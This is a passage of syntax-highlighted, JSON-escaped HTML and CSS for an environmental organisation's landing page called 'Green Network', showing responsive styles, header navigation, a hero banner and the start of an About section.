class=\"o\"\u003e(\u003c/span\u003e-7px\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced lift */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .copyright \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-align: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding-top: 2.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-top: 1px solid rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e255, 255, 255, 0.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .mobile-menu \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            cursor: pointer\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 0.5rem 1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border: 1px solid rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e255, 255, 255, 0.3\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 5px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: all 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .mobile-menu:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e255, 255, 255, 0.1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        @media \u003cspan class=\"o\"\u003e(\u003c/span\u003emax-width: 992px\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .about-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: 1fr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .initiatives-grid \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: repeat\u003cspan class=\"o\"\u003e(\u003c/span\u003e2, 1fr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .footer-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: repeat\u003cspan class=\"o\"\u003e(\u003c/span\u003e2, 1fr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .stats \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: repeat\u003cspan class=\"o\"\u003e(\u003c/span\u003e2, 1fr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        @media \u003cspan class=\"o\"\u003e(\u003c/span\u003emax-width: 768px\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .hero h1 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                font-size: 2.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Adjusted \u003cspan class=\"k\"\u003efor\u003c/span\u003e better readability on smaller screens */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .hero p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                font-size: 1.2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Adjusted \u003cspan class=\"k\"\u003efor\u003c/span\u003e better readability on smaller screens */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nav ul \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                display: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                position: absolute\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                top: 100%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                left: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                width: 100%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--primary\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                flex-direction: column\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                padding: 1rem 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                text-align: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 5px 10px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nav ul.active \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                display: flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            nav ul li \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                margin: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                padding: 0.8rem 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .mobile-menu \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                display: block\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                font-size: 1.2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly smaller \u003cspan class=\"k\"\u003efor\u003c/span\u003e mobile */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                padding: 0.4rem 0.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .initiatives-grid \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: 1fr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .footer-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: 1fr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .stats \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                grid-template-columns: 1fr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .social-links a \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                width: 45px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly smaller social buttons */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                height: 45px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                font-size: 0.85rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        /* Animation \u003cspan class=\"k\"\u003efor\u003c/span\u003e stats counter */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .counter \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: all 0.5s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/style\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;!-- Header --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;header\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;container nav-container\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;logo\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;span\u0026gt;Green Network\u0026lt;/span\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;nav\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;mobile-menu\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    Menu\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;ul\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#home\u0026#34;\u003c/span\u003e\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#about\u0026#34;\u003c/span\u003e\u0026gt;About\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#initiatives\u0026#34;\u003c/span\u003e\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#get-involved\u0026#34;\u003c/span\u003e\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#contact\u0026#34;\u003c/span\u003e\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/ul\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/nav\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/header\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;!-- Hero Section --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;section \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;hero\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;home\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;container hero-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;h1\u0026gt;Protect Our Planet, Preserve Our Future\u0026lt;/h1\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;p\u0026gt;Join the global movement to create a sustainable world through conservation, education, and community action.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#get-involved\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;btn\u0026#34;\u003c/span\u003e\u0026gt;Join Our Network\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/section\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;!-- About Section --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;section \u003cspan class=\"nv\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;about\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;container\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;section-title\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;h2\u0026gt;About Green Network\u0026lt;/h2\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;p\u0026gt;We are a global community dedicated to environmental protection and sustainable development.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;about-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;about-img\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;img \u003cspan class=\"nv\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan 